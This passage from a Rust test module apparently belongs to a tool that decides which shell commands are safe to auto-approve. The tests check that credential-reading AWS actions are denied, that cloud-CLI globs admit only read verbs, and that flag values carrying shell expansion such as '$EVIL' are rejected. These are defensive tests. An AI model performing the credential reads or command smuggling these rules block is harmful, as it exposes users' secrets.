            ("secretsmanager", "list-secret-version-ids", "version IDs/stages, not values"),
            ("secretsmanager", "list-secrets", "secret metadata list, not values"),
            ("sso-admin", "describe-instance-access-control-attribute-configuration", "ABAC attribute-mapping config, not credentials"),
            ("wafv2", "get-decrypted-api-key", "output is TokenDomains + CreationTimestamp; no usable key value"),
            ("wafv2", "list-api-keys", "CAPTCHA client-integration tokens, embedded in public JS by design"),
            ("workmail", "get-personal-access-token-metadata", "PAT metadata (name/expiry), not the token"),
            ("workmail", "list-personal-access-tokens", "PAT metadata list, not the tokens"),
        ];
        let fixture = include_str!("../../tests/fixtures/aws_credential_smell_actions.tsv");
        let grand: std::collections::HashSet<(&str, &str)> =
            GRANDFATHER.iter().map(|(s, a, _)| (*s, *a)).collect();
        let mut rows = 0;
        let mut denied = 0;
        let mut residue = Vec::new();
        for line in fixture.lines().filter(|l| !l.trim().is_empty() && !l.starts_with('#')) {
            let mut it = line.split('\t');
            let (Some(svc), Some(act)) = (it.next(), it.next()) else { continue };
            rows += 1;
            if crate::is_safe_command(&format!("aws {svc} {act}")) {
                if !grand.contains(&(svc, act)) {
                    residue.push(format!("aws {svc} {act}"));
                }
            } else {
                denied += 1;
            }
        }
        assert!(
            residue.is_empty(),
            "credential-smell AWS actions auto-approve with no grandfather entry — carve them out, or \
             GRANDFATHER with a verified reason (checked its botocore output shape):\n  {}",
            residue.join("\n  "),
        );
        assert!(rows >= 50, "fixture shrank unexpectedly: {rows} rows");
        assert!(denied >= 25, "too few denies — carve-outs may have regressed: {denied}");
        for (s, a, _) in GRANDFATHER {
            assert!(
                fixture.lines().any(|l| l == format!("{s}\t{a}")),
                "stale GRANDFATHER entry not in fixture: {s} {a}",
            );
        }
    }

    /// UNIVERSAL structural guard for verb-glob CLIs (#5). A `first_arg` glob matches the FIRST token
    /// and IGNORES the rest — correct for a VERB glob (`get-*`, `describe`), catastrophic for a glob
    /// listing SUBGROUP names: `gcloud redis ["instances","operations"]` auto-approves EVERY verb under
    /// `instances` (create, delete, irreversible-destroy, `get-auth-string`), because dispatch stops at
    /// the first token. The primitive is sharp on purpose; this guard de-fangs its MISUSE across the
    /// whole registry. Each hierarchical `<binary> <group> <subgroup…> <verb>` CLI registers its vetted
    /// read-verb set in VERB_GLOB_CLIS; the guard walks that command's tree and fails on any glob token
    /// outside the set (a subgroup name → make it a sub-sub; a mutating/credential verb → drop/carve).
    /// Adding a new cloud CLI (oci, kubectl) is a ONE-ROW entry, not a new bespoke guard.
    #[test]
    fn verb_glob_clis_admit_only_read_verbs() {
        use super::types::DispatchKind;
        // (command, vetted read verbs — the ONLY tokens safe to admit via a first_arg glob for it).
        let verb_glob_clis: &[(&str, &[&str])] = &[
            (
                "gcloud",
                &[
                    "describe", "list", "get-iam-policy", "get-ancestors-iam-policy", "log", "read", "ls",
                    // group-specific analysis reads (no state change), vetted:
                    "compute", "lint-condition", "query-activity", "troubleshoot-policy",
                ],
            ),
            (
                "az",
                &[
                    "show", "list",
                    // vetted safe list-* variants (metadata, not credentials):
                    "list-locations", "list-sizes", "list-ip-addresses", "list-instances", "list-skus",
                    "list-usages", "list-service-tiers", "list-editions", "list-runtimes",
                    "get-instance-view", "list-deleted", "wait",
                    // group-specific reads (no state change), vetted:
                    "query", "name-exists", "logs",
                ],
            ),
        ];
        fn walk(prefix: &str, kind: &DispatchKind, read_verbs: &[&str], bad: &mut Vec<String>) {
            let check = |pfx: &str, patterns: &[String], bad: &mut Vec<String>| {
                for p in patterns {
                    if !read_verbs.contains(&p.as_str()) {
                        bad.push(format!("{pfx}: `{p}`"));
                    }
                }
            };
            match kind {
                DispatchKind::FirstArg { patterns, .. } => check(prefix, patterns, bad),
                DispatchKind::Branching { subs, first_arg, .. } => {
                    check(prefix, first_arg, bad);
                    for s in subs {
                        walk(&format!("{prefix} {}", s.name), &s.kind, read_verbs, bad);
                    }
                }
                _ => {}
            }
        }
        let mut bad = Vec::new();
        for (cmd, read_verbs) in verb_glob_clis {
            if let Some(spec) = TOML_REGISTRY.get(*cmd) {
                walk(cmd, &spec.kind, read_verbs, &mut bad);
            }
        }
        assert!(
            bad.is_empty(),
            "verb-glob CLIs admit non-read tokens ({} — a subgroup name → make it a sub-sub with a \
             read-verb glob; a mutating/credential verb → drop it or carve as credential-read):\n  {}",
            bad.len(),
            bad.join("\n  "),
        );
    }

    #[test]
    fn all_toml_commands_have_description() {
        let mut missing = Vec::new();
        for (key, spec) in TOML_REGISTRY.iter() {
            if *key != spec.name {
                continue;
            }
            if spec.description.is_empty() {
                missing.push(spec.name.as_str());
            }
        }
        assert!(
            missing.is_empty(),
            "{} TOML commands missing description:\n{}",
            missing.len(),
            missing.join(", "),
        );
    }

    #[test]
    fn researched_version_round_trips() {
        let spec = load_one(r#"
            [[command]]
            name = "demo"
            researched_version = "demo-cli 1.9.0 (2026-05-08)"
        "#);
        assert_eq!(
            spec.researched_version.as_deref(),
            Some("demo-cli 1.9.0 (2026-05-08)"),
        );
    }

    #[test]
    fn researched_version_optional_defaults_to_none() {
        let spec = load_one(r#"
            [[command]]
            name = "demo"
        "#);
        assert!(spec.researched_version.is_none());
    }

    #[test]
    fn researched_version_does_not_render_in_docs() {
        // Internal-only field — not rendered as part of the command
        // doc body. Future commits can add a separate documentation
        // surface; today the field is purely a tripwire for the next
        // re-research pass.
        let spec = load_one(r#"
            [[command]]
            name = "demo"
            researched_version = "9.9.9"
        "#);
        let doc = spec.to_command_doc();
        assert!(
            !doc.description.contains("9.9.9"),
            "researched_version leaked into doc body: {}",
            doc.description,
        );
    }

    #[test]
    fn handler_command_with_doc_body_renders_body() {
        let spec = load_one(r#"
            [[command]]
            name = "demo"
            handler = "demo_handler"
            doc_body = "- Allowed standalone flags: --foo\n- Allowed valued flags: --bar"
        "#);
        let doc = spec.to_command_doc();
        assert!(doc.description.contains("--foo"), "body missing --foo: {}", doc.description);
        assert!(doc.description.contains("--bar"), "body missing --bar: {}", doc.description);
    }

    #[test]
    fn handler_command_without_doc_body_renders_empty() {
        let spec = load_one(r#"
            [[command]]
            name = "demo"
            handler = "demo_handler"
        "#);
        let doc = spec.to_command_doc();
        assert_eq!(doc.description, "");
    }

    #[test]
    fn handler_command_renders_delegating_subs() {
        // Regression: subs whose kind is DelegateSkip / DelegateAfterSeparator
        // used to render nothing in SubSpec::doc_line, so handler-using
        // commands like magick (delegate_skip = 0 on convert/identify) and
        // php (delegate_skip = 0 on artisan/please) silently dropped
        // those subs from auto-rendered docs. They must surface as
        // delegation lines now.
        let spec = load_one(r#"
[[command]]
name = "demo-delegate"
handler = "demo_handler"

[[command.sub]]
name = "passthrough"
delegate_skip = 0

[[command.sub]]
name = "after"
delegate_after = "--"
"#);
        let doc = spec.to_command_doc();
        assert!(
            doc.description.contains("**passthrough**"),
            "delegate_skip sub label must render: {}",
            doc.description,
        );
        assert!(
            doc.description.contains("**after**"),
            "delegate_after sub label must render: {}",
            doc.description,
        );
        assert!(
            doc.description.contains("delegates"),
            "delegation must be indicated: {}",
            doc.description,
        );
    }

    #[test]
    fn matrix_dispatch_routes_parent_action_to_policy() {
        // The [[command.matrix]] primitive expresses "parent ∈ list ×
        // action ∈ map → handler_policy by name." This test exercises:
        // (a) the simple form (action = "policy_name"), (b) the
        // detailed form with a guard, (c) auto-render surfaces it.
        let spec = load_one(r#"
[[command]]
name = "demo-matrix"
handler = "demo_handler"

[command.handler_policy.list_policy]
bare = true
standalone = ["--help", "--limit"]

[command.handler_policy.download_policy]
bare = false
standalone = ["--output"]

[[command.matrix]]
parents = ["alpha", "beta"]
level = "Inert"
[command.matrix.actions]
list = "list_policy"

[[command.matrix]]
parents = ["alpha"]
level = "SafeWrite"
[command.matrix.actions.download]
policy = "download_policy"
guard = "--output"
guard_short = "-O"
"#);
        match &spec.kind {
            DispatchKind::Custom { matrices, .. } => {
                assert_eq!(matrices.len(), 2);
                assert_eq!(matrices[0].level, SafetyLevel::Inert);
                assert_eq!(matrices[1].level, SafetyLevel::SafeWrite);
                let list_action = matrices[0].actions.get("list").expect("list action");
                assert_eq!(list_action.policy_key, "list_policy");
                assert!(list_action.guard.is_none());
                let dl = matrices[1].actions.get("download").expect("download action");
                assert_eq!(dl.policy_key, "download_policy");
                assert_eq!(dl.guard.as_deref(), Some("--output"));
                assert_eq!(dl.guard_short.as_deref(), Some("-O"));
            }
            other => panic!("expected Custom, got {other:?}"),
        }

        let doc = spec.to_command_doc();
        assert!(
            doc.description.contains("Subcommands by action verb"),
            "matrix section header must render: {}",
            doc.description,
        );
        assert!(
            doc.description.contains("alpha, beta"),
            "parents must render: {}",
            doc.description,
        );
        assert!(
            doc.description.contains("requires -O/--output"),
            "guard must render: {}",
            doc.description,
        );
    }

    #[test]
    fn matrix_inlines_single_use_policy_summaries() {
        // Reader-friendly: a matrix action whose policy is referenced
        // only by that one entry should inline the flag list right
        // there, not force a scroll to a "shared flag sets" section.
        let spec = load_one(r#"
[[command]]
name = "demo-inline"
handler = "demo_handler"

[command.handler_policy.unique]
bare = false
standalone = ["--only-here"]
valued = ["--only-valued"]

[[command.matrix]]
parents = ["alpha"]
level = "Inert"
[command.matrix.actions]
list = "unique"
"#);
        let doc = spec.to_command_doc();
        assert!(
            doc.description.contains("--only-here"),
            "single-use policy flags must inline into the matrix entry: {}",
            doc.description,
        );
        assert!(
            !doc.description.contains("Shared flag sets"),
            "shared-flag-sets header must NOT render when all policies are single-use: {}",
            doc.description,
        );
    }

    #[test]
    fn sub_with_shared_policy_ref_renders_reference_not_inline() {
        // Regression: a [[command.sub]] using `policy = "key"` where
        // the same key is also referenced 2+ times in the matrix must
        // render the sub as `- **name** — see `key` below`, not
        // inline the flag list. Otherwise the same list appears in
        // both the sub bullet and the **Shared flag sets** section.
        let spec = load_one(r#"
[[command]]
name = "demo-shared-sub"
handler = "demo_handler"

[command.handler_policy.canonical]
bare = false
standalone = ["--unique-flag-marker"]
valued = ["--unique-valued-marker"]

[[command.sub]]
name = "alias-sub"
policy = "canonical"
level = "Inert"

[[command.matrix]]
parents = ["alpha", "beta"]
level = "Inert"
[command.matrix.actions]
verify = "canonical"
watch = "canonical"
"#);
        let doc = spec.to_command_doc();
        assert!(
            doc.description.contains("**alias-sub** — see `canonical` below"),
            "sub with shared policy_ref must render as reference: {}",
            doc.description,
        );
        // Unique flag marker appears exactly once — in the shared
        // section. Not in the sub, not duplicated in the matrix.
        let count = doc.description.matches("--unique-flag-marker").count();
        assert_eq!(
            count, 1,
            "shared policy flag list must render exactly once (in Shared flag sets): {}",
            doc.description,
        );
    }

    #[test]
    fn matrix_references_shared_policies_in_their_own_section() {
        // A policy used 2+ times in the matrix should appear in a
        // **Shared flag sets** section below, with each matrix entry
        // referencing it by name instead of duplicating the flag list.
        let spec = load_one(r#"
[[command]]
name = "demo-shared"
handler = "demo_handler"

[command.handler_policy.shared]
bare = false
standalone = ["--web", "-w"]
valued = ["--repo"]

[[command.matrix]]
parents = ["alpha", "beta"]
level = "Inert"
[command.matrix.actions]
verify = "shared"
watch = "shared"
"#);
        let doc = spec.to_command_doc();
        assert!(
            doc.description.contains("Shared flag sets"),
            "shared section must render when a policy is used 2+ times: {}",
            doc.description,
        );
        assert!(
            doc.description.contains("see `shared` below"),
            "matrix entry must reference the shared policy by name: {}",
            doc.description,
        );
        // Flag list should appear in shared section, not twice inline.
        let occurrences = doc.description.matches("--web").count();
        assert_eq!(
            occurrences, 1,
            "shared policy flags should appear once (in the shared section), not be duplicated across matrix entries: {}",
            doc.description,
        );
    }

    #[test]
    fn check_handler_policy_returns_false_for_missing_key() {
        // Built spec without the requested policy key — handler should
        // get back `false` (i.e. denial) rather than a panic.
        let spec = load_one(r#"
[[command]]
name = "demo-cp"
handler = "demo_handler"

[command.handler_policy.list]
bare = true
standalone = ["--help"]
"#);
        match &spec.kind {
            DispatchKind::Custom { handler_policies, .. } => {
                assert!(handler_policies.contains_key("list"));
                assert!(!handler_policies.contains_key("nope"));
            }
            other => panic!("expected Custom, got {other:?}"),
        }
    }

    #[test]
    fn handler_command_renders_subs_and_fallback_data() {
        // Auto-render: a handler-using command's [[command.sub]] and
        // [command.fallback] data must surface in the doc description
        // alongside any handwritten doc_body, so docs stay in sync with
        // the TOML allowlist instead of relying on hand-edited prose.
        let spec = load_one(r#"
[[command]]
name = "demo-render"
handler = "demo_handler"
doc_body = "Routing prose explaining the dispatch."

[[command.sub]]
name = "diag"
standalone = ["--help", "-h"]
max_positional = 0

[[command.sub]]
name = "list"
level = "SafeRead"
standalone = ["--help"]

[command.fallback]
level = "Inert"
bare = true
max_positional = 1
positional_shape = "path"
standalone = ["--help"]
valued = ["--type"]
"#);
        let doc = spec.to_command_doc();
        assert!(
            doc.description.contains("Routing prose explaining"),
            "doc_body must still render: {}",
            doc.description,
        );
        assert!(
            doc.description.contains("**diag**"),
            "TOML-declared sub `diag` must render: {}",
            doc.description,
        );
        assert!(
            doc.description.contains("**list**"),
            "TOML-declared sub `list` must render: {}",
            doc.description,
        );
        assert!(
            doc.description.contains("Without a subcommand"),
            "bare-flag section header must render: {}",
            doc.description,
        );
        assert!(
            doc.description.contains("--type"),
            "fallback valued flags must render: {}",
            doc.description,
        );
        assert!(
            doc.description.contains("must look like a path"),
            "positional_shape must render: {}",
            doc.description,
        );
    }

    #[test]
    fn handler_sub_with_doc_body_renders_in_parent_body() {
        let spec = load_one(r#"
            [[command]]
            name = "demo"
            bare = false
            [[command.sub]]
            name = "rare-mode"
            handler = "demo_sub"
            doc_body = "requires --opt with one of red, green, blue"
        "#);
        let doc = spec.to_command_doc();
        assert!(
            doc.description.contains("**rare-mode**"),
            "body missing sub label: {}",
            doc.description,
        );
        assert!(
            doc.description.contains("requires --opt"),
            "body missing sub doc_body: {}",
            doc.description,
        );
    }

    #[test]
    fn handler_sub_without_doc_body_renders_label_only() {
        let spec = load_one(r#"
            [[command]]
            name = "demo"
            bare = false
            [[command.sub]]
            name = "rare-mode"
            handler = "demo_sub"
        "#);
        let doc = spec.to_command_doc();
        assert!(
            doc.description.contains("**rare-mode**"),
            "body missing sub label: {}",
            doc.description,
        );
    }

    #[test]
    fn doc_body_does_not_affect_dispatch_for_handler_command() {
        // Sanity-check: doc_body is purely a docs concern; the handler
        // is still what gets dispatched. We use a known handler (php)
        // because tests can't register new handlers at runtime.
        let spec = load_one(r#"
            [[command]]
            name = "php"
            handler = "php"
            doc_body = "anything here"
        "#);
        // bare php still denied via the handler
        assert_eq!(
            super::dispatch_spec(&toks(&["php"]), &spec),
            Verdict::Denied,
        );
    }

    // -------------------------------------------------------------------
    // eval_safe build-time validation
    // -------------------------------------------------------------------

    #[test]
    #[should_panic(expected = "eval_safe_flags` without `eval_safe = true")]
    fn eval_safe_flags_without_tag_panics_command() {
        load_one(r#"
            [[command]]
            name = "ssh-agent"
            bare = true
            eval_safe_flags = ["-s"]
        "#);
    }

    #[test]
    #[should_panic(expected = "eval_safe_flags` without `eval_safe = true")]
    fn eval_safe_flags_without_tag_panics_sub() {
        load_one(r#"
            [[command]]
            name = "demo"
            [[command.sub]]
            name = "init"
            eval_safe_flags = ["--shims"]
        "#);
    }

    #[test]
    #[should_panic(expected = "eval_safe = true` at the command level AND")]
    fn eval_safe_command_with_subs_panics() {
        load_one(r#"
            [[command]]
            name = "demo"
            researched_version = "test"
            eval_safe = true
            [[command.sub]]
            name = "init"
        "#);
    }

    /// Command-level `eval_safe = true` IS allowed alongside
    /// `handler = "..."`. The walker reads spec.eval_safe directly at
    /// the leaf; no handler introspection is needed. The contributor
    /// takes responsibility for vouching that every invocation the
    /// handler accepts AND that passes the eval_safe_* flag checks
    /// produces shell-init stdout. Sub-level handler+eval_safe is
    /// still rejected because it'd require descending the handler's
    /// own dispatch tree.
    #[test]
    fn eval_safe_handler_command_builds() {
        let spec = load_one(r#"
            [[command]]
            name = "php"
            researched_version = "test"
            handler = "php"
            eval_safe = true
            eval_safe_flags = ["--bash"]
            eval_safe_required_flags = ["--bash"]
        "#);
        assert!(spec.eval_safe);
        assert!(super::is_eval_safe_for_spec(&spec, &toks(&["php", "--bash"])));
        // Required flag missing => denied.
        assert!(!super::is_eval_safe_for_spec(&spec, &toks(&["php"])));
    }

    #[test]
    #[should_panic(expected = "eval_safe = true` AND `[command.wrapper]")]
    fn eval_safe_wrapper_command_panics() {
        load_one(r#"
            [[command]]
            name = "demo"
            researched_version = "test"
            eval_safe = true
            [command.wrapper]
            positional_skip = 1
        "#);
    }

    #[test]
    #[should_panic(expected = "deny = true` and `eval_safe = true")]
    fn eval_safe_with_deny_panics() {
        load_one(r#"
            [[command]]
            name = "demo"
            researched_version = "test"
            deny = true
            eval_safe = true
        "#);
    }

    #[test]
    #[should_panic(expected = "eval_safe = true` AND has nested")]
    fn eval_safe_sub_with_nested_subs_panics() {
        load_one(r#"
            [[command]]
            name = "demo"
            researched_version = "test"
            [[command.sub]]
            name = "config"
            eval_safe = true
            [[command.sub.sub]]
            name = "get"
        "#);
    }

    #[test]
    #[should_panic(expected = "eval_safe = true` AND `handler")]
    fn eval_safe_handler_sub_panics() {
        load_one(r#"
            [[command]]
            name = "demo"
            researched_version = "test"
            [[command.sub]]
            name = "init"
            handler = "php"
            eval_safe = true
        "#);
    }

    #[test]
    #[should_panic(expected = "eval_safe = true` AND delegates")]
    fn eval_safe_delegate_sub_panics() {
        load_one(r#"
            [[command]]
            name = "demo"
            researched_version = "test"
            [[command.sub]]
            name = "exec"
            delegate_after = "--"
            eval_safe = true
        "#);
    }

    #[test]
    fn eval_safe_on_flat_command_builds() {
        let spec = load_one(r#"
            [[command]]
            name = "ssh-agent"
            bare = true
            eval_safe = true
            researched_version = "OpenSSH 9.8"
        "#);
        assert!(spec.eval_safe);
        assert!(spec.eval_safe_flags.is_empty());
    }

    #[test]
    #[should_panic(expected = "but no `researched_version")]
    fn eval_safe_command_without_researched_version_panics() {
        load_one(r#"
            [[command]]
            name = "ssh-agent"
            bare = true
            eval_safe = true
        "#);
    }

    #[test]
    #[should_panic(expected = "but no `researched_version")]
    fn eval_safe_sub_without_command_researched_version_panics() {
        load_one(r#"
            [[command]]
            name = "demo"
            [[command.sub]]
            name = "init"
            bare = false
            max_positional = 1
            eval_safe = true
        "#);
    }

    #[test]
    fn eval_safe_sub_with_command_researched_version_builds() {
        let spec = load_one(r#"
            [[command]]
            name = "demo"
            researched_version = "v1.0"
            [[command.sub]]
            name = "init"
            bare = false
            max_positional = 1
            eval_safe = true
        "#);
        let DispatchKind::Branching { subs, .. } = &spec.kind else {
            panic!("expected branching kind");
        };
        let init = subs.iter().find(|s| s.name == "init").expect("init sub");
        assert!(init.eval_safe);
    }

    #[test]
    fn eval_safe_on_leaf_sub_builds() {
        let spec = load_one(r#"
            [[command]]
            name = "demo"
            researched_version = "v1.0"
            [[command.sub]]
            name = "init"
            bare = false
            max_positional = 1
            standalone = ["--shims"]
            eval_safe = true
            eval_safe_flags = ["--shims"]
        "#);
        // The walker tests live in src/tests.rs and exercise the full
        // path; here we only confirm the build succeeds for a tagged
        // leaf sub.
        let DispatchKind::Branching { subs, .. } = &spec.kind else {
            panic!("expected branching kind, got {:?}", spec.kind);
        };
        let init = subs.iter().find(|s| s.name == "init").expect("init sub");
        assert!(init.eval_safe);
        assert_eq!(init.eval_safe_flags, vec!["--shims".to_string()]);
    }

    // -------------------------------------------------------------------
    // Walker descent — Branching and Custom kinds
    // -------------------------------------------------------------------

    /// A tagged leaf sub inside a handler-based (Custom kind) command is
    /// reached by the walker. Before Gap A this descent silently failed
    /// because the walker only matched `Branching`.
    #[test]
    fn walker_descends_custom_subs() {
        let spec = load_one(r#"
            [[command]]
            name = "php"
            handler = "php"
            researched_version = "v1.0"
            [[command.sub]]
            name = "demo-init"
            bare = true
            max_positional = 0
            eval_safe = true
        "#);
        assert!(matches!(spec.kind, DispatchKind::Custom { .. }));
        assert!(super::is_eval_safe_for_spec(&spec, &toks(&["php", "demo-init"])));
    }

    /// Untagged subs inside a Custom kind do NOT inherit the parent's
    /// status. The walker descends to the leaf and finds it untagged.
    #[test]
    fn walker_custom_untagged_sub_denied() {
        let spec = load_one(r#"
            [[command]]
            name = "php"
            handler = "php"
            researched_version = "v1.0"
            [[command.sub]]
            name = "demo-init"
            bare = true
            max_positional = 0
        "#);
        assert!(!super::is_eval_safe_for_spec(&spec, &toks(&["php", "demo-init"])));
    }

    /// Walker descent through Custom must behave identically to Branching
    /// when the sub structure is the same. This isolates the descent
    /// change from any unintended behavior shift.
    #[test]
    fn walker_branching_and_custom_descent_agree() {
        let branching = load_one(r#"
            [[command]]
            name = "demo"
            researched_version = "v1.0"
            [[command.sub]]
            name = "init"
            bare = true
            max_positional = 0
            eval_safe = true
        "#);
        let custom = load_one(r#"
            [[command]]
            name = "demo"
            handler = "php"
            researched_version = "v1.0"
            [[command.sub]]
            name = "init"
            bare = true
            max_positional = 0
            eval_safe = true
        "#);
        for tail in [vec!["init"], vec!["init", "x"], vec!["other"], vec![]] {
            let mut tokens = vec!["demo"];
            tokens.extend(tail.iter().copied());
            let parsed = toks(&tokens);
            assert_eq!(
                super::is_eval_safe_for_spec(&branching, &parsed),
                super::is_eval_safe_for_spec(&custom, &parsed),
                "descent disagrees for tail {tail:?}",
            );
        }
    }

    /// Empty token list never returns true (defense in depth — caller
    /// shouldn't pass empties but we guarantee the answer regardless).
    #[test]
    fn walker_empty_tokens_returns_false() {
        let spec = load_one(r#"
            [[command]]
            name = "demo"
            researched_version = "v1.0"
            bare = true
            eval_safe = true
        "#);
        assert!(!super::is_eval_safe_for_spec(&spec, &[]));
    }

    proptest::proptest! {
        /// For any spec built from a tagged sub-only TOML, the walker
        /// returns true iff the tokens exactly traverse to the tagged
        /// sub and the tail satisfies the flag allowlist. We model the
        /// tail as a single shell-name positional plus a subset of the
        /// allowed flags — both should always be eval-safe.
        #[test]
        fn walker_accepts_traversal_to_tagged_leaf(
            shell in proptest::string::string_regex("[a-z]{1,8}").expect("regex"),
            extra_flags in proptest::collection::vec(proptest::sample::select(vec!["--alpha", "--beta", "--gamma"]), 0..4),
        ) {
            let spec = load_one(r#"
                [[command]]
                name = "demo"
                researched_version = "v1.0"
                [[command.sub]]
                name = "init"
                bare = false
                max_positional = 1
                standalone = ["--alpha", "--beta", "--gamma"]
                eval_safe = true
                eval_safe_flags = ["--alpha", "--beta", "--gamma"]
            "#);
            let mut words = vec!["demo".to_string(), "init".to_string(), shell.clone()];
            for f in &extra_flags { words.push((*f).to_string()); }
            let tokens: Vec<Token> = words.iter().map(|s| Token::from_test(s.as_str())).collect();
            proptest::prop_assert!(
                super::is_eval_safe_for_spec(&spec, &tokens),
                "walker rejected legal traversal: {words:?}"
            );
        }

        /// For any spec whose tagged sub's eval_safe_flags is empty, ANY
        /// flag in the substituted tail is denied. This is the
        /// allowlist-only invariant: presence-of-tag alone never opens
        /// the flag surface.
        #[test]
        fn walker_rejects_any_flag_when_allowlist_empty(
            flag in proptest::sample::select(vec!["--anything", "--help", "-v", "-h", "--evil"]),
        ) {
            let spec = load_one(r#"
                [[command]]
                name = "demo"
                researched_version = "v1.0"
                [[command.sub]]
                name = "init"
                bare = true
                max_positional = 0
                eval_safe = true
            "#);
            let tokens = toks(&["demo", "init", flag]);
            proptest::prop_assert!(
                !super::is_eval_safe_for_spec(&spec, &tokens),
                "walker accepted flag despite empty allowlist: {flag}"
            );
        }
    }

    // -------------------------------------------------------------------
    // Per-flag value allowlist (Gap C)
    // -------------------------------------------------------------------

    fn aws_export_credentials_spec() -> CommandSpec {
        load_one(r#"
            [[command]]
            name = "demo"
            researched_version = "v1.0"
            [[command.sub]]
            name = "export"
            bare = true
            max_positional = 0
            standalone = ["--help"]
            valued = ["--format", "--profile"]
            eval_safe = true
            eval_safe_flags = ["--format", "--profile"]
            [command.sub.eval_safe_flag_values]
            --format = ["env", "env-no-export", "fish", "powershell", "windows-cmd"]
            --profile = []
        "#)
    }

    #[test]
    fn flag_value_allowlist_accepts_listed_value_space_form() {
        let spec = aws_export_credentials_spec();
        assert!(super::is_eval_safe_for_spec(&spec, &toks(&["demo", "export", "--format", "env"])));
    }

    #[test]
    fn flag_value_allowlist_accepts_listed_value_eq_form() {
        let spec = aws_export_credentials_spec();
        assert!(super::is_eval_safe_for_spec(&spec, &toks(&["demo", "export", "--format=env"])));
    }

    #[test]
    fn flag_value_allowlist_rejects_unlisted_value() {
        let spec = aws_export_credentials_spec();
        assert!(!super::is_eval_safe_for_spec(&spec, &toks(&["demo", "export", "--format", "json"])));
        assert!(!super::is_eval_safe_for_spec(&spec, &toks(&["demo", "export", "--format=json"])));
        assert!(!super::is_eval_safe_for_spec(&spec, &toks(&["demo", "export", "--format=process"])));
    }

    #[test]
    fn flag_value_allowlist_rejects_missing_value() {
        let spec = aws_export_credentials_spec();
        // --format with no following token is denied — the flag is
        // structurally valued in eval_safe_flag_values.
        assert!(!super::is_eval_safe_for_spec(&spec, &toks(&["demo", "export", "--format"])));
    }

    #[test]
    fn flag_value_allowlist_rejects_empty_value() {
        let spec = aws_export_credentials_spec();
        // Empty value via either form is denied for any valued flag
        // declared in eval_safe_flag_values — including the
        // explicit-unrestricted `--profile = []` posture. The bare-
        // literal alphabet check vacuously passes empty strings, so
        // the walker has to reject explicitly.
        assert!(!super::is_eval_safe_for_spec(&spec, &toks(&["demo", "export", "--format="])));
        assert!(!super::is_eval_safe_for_spec(&spec, &toks(&["demo", "export", "--format", ""])));
        assert!(!super::is_eval_safe_for_spec(&spec, &toks(&["demo", "export", "--profile="])));
        assert!(!super::is_eval_safe_for_spec(&spec, &toks(&["demo", "export", "--profile", ""])));
    }

    #[test]
    fn flag_value_allowlist_does_not_affect_other_flags() {
        let spec = aws_export_credentials_spec();
        // --profile is allowed without value-checking (not in
        // eval_safe_flag_values); any value reaching the walker is OK
        // because the bare-literal alphabet was checked upstream.
        assert!(super::is_eval_safe_for_spec(&spec, &toks(&["demo", "export", "--profile", "dev"])));
        assert!(super::is_eval_safe_for_spec(&spec, &toks(&["demo", "export", "--profile=dev"])));
    }

    #[test]
    fn flag_value_allowlist_combines_with_other_flags() {
        let spec = aws_export_credentials_spec();
        assert!(super::is_eval_safe_for_spec(
            &spec,
            &toks(&["demo", "export", "--format", "env", "--profile", "dev"]),
        ));
        // Bad value still denies, even with other valid flags present.
        assert!(!super::is_eval_safe_for_spec(
            &spec,
            &toks(&["demo", "export", "--profile", "dev", "--format", "json"]),
        ));
    }

    #[test]
    #[should_panic(expected = "eval_safe_flag_values` but not in `eval_safe_flags")]
    fn flag_value_without_flag_in_allowlist_panics() {
        load_one(r#"
            [[command]]
            name = "demo"
            researched_version = "v1.0"
            [[command.sub]]
            name = "export"
            bare = true
            max_positional = 0
            valued = ["--format"]
            eval_safe = true
            eval_safe_flags = ["--profile"]
            [command.sub.eval_safe_flag_values]
            --format = ["env"]
        "#);
    }

    #[test]
    #[should_panic(expected = "characters outside `[a-zA-Z0-9_./=-]")]
    fn flag_value_with_expansion_trigger_panics() {
        load_one(r#"
            [[command]]
            name = "demo"
            researched_version = "v1.0"
            [[command.sub]]
            name = "export"
            bare = true
            max_positional = 0
            standalone = ["--format"]
            eval_safe = true
            eval_safe_flags = ["--format"]
            [command.sub.eval_safe_flag_values]
            --format = ["$EVIL"]
        "#);
    }

    proptest::proptest! {
        /// For any spec with `eval_safe_flag_values = {"--format": [<set>]}`,
        /// only values in the set are accepted, regardless of form
        /// (space-separated or `=`-joined). Generated test values are
        /// constrained to the bare-literal alphabet to bypass the
        /// upstream alphabet check.
        #[test]
        fn walker_value_allowlist_is_exhaustive(
            value in proptest::string::string_regex("[a-z]{1,8}").expect("regex"),
            form in proptest::sample::select(vec!["space", "eq"]),
        ) {
            let allowed_values = ["env", "json", "fish", "windows-cmd"];
            let spec = load_one(r#"
                [[command]]
                name = "demo"
                researched_version = "v1.0"
                [[command.sub]]
                name = "export"
                bare = true
                max_positional = 0
                standalone = ["--format"]
                eval_safe = true
                eval_safe_flags = ["--format"]
                [command.sub.eval_safe_flag_values]
                --format = ["env", "json", "fish", "windows-cmd"]
            "#);
            let tokens = match form {
                "eq" => toks(&["demo", "export", &format!("--format={value}")]),
                _ => toks(&["demo", "export", "--format", &value]),
            };
            let expected = allowed_values.iter().any(|v| *v == value.as_str());
            let actual = super::is_eval_safe_for_spec(&spec, &tokens);
            proptest::prop_assert_eq!(
                actual,
                expected,
                "walker disagreed for value {:?} (form={}): expected {}, got {}",
                value, form, expected, actual,
            );
        }
    }

    // -------------------------------------------------------------------
    // Required-flag-from-set (Gap B)
    // -------------------------------------------------------------------

    fn fzf_shell_init_spec() -> CommandSpec {
        load_one(r#"
            [[command]]
            name = "demo"
            researched_version = "v1.0"
            bare = false
            max_positional = 0
            standalone = ["--bash", "--zsh", "--fish", "--nushell"]
            eval_safe = true
            eval_safe_flags = ["--bash", "--zsh", "--fish", "--nushell"]
            eval_safe_required_flags = ["--bash", "--zsh", "--fish", "--nushell"]
        "#)
    }

    #[test]
    fn required_flags_bare_invocation_denied() {
        let spec = fzf_shell_init_spec();
        assert!(!super::is_eval_safe_for_spec(&spec, &toks(&["demo"])));
    }

    #[test]
    fn required_flags_one_present_allowed() {
        let spec = fzf_shell_init_spec();
        for flag in ["--bash", "--zsh", "--fish", "--nushell"] {
            assert!(
                super::is_eval_safe_for_spec(&spec, &toks(&["demo", flag])),
                "{flag} should satisfy required-flag check",
            );
        }
    }

    #[test]
    fn required_flags_two_present_allowed() {
        let spec = fzf_shell_init_spec();
        assert!(super::is_eval_safe_for_spec(&spec, &toks(&["demo", "--bash", "--zsh"])));
    }

    #[test]
    fn required_flags_unrelated_allowed_flag_denied() {
        // Allowlist a "harmless" flag alongside the required set, but
        // require one of the init flags. An invocation with only the
        // harmless flag should still be denied.
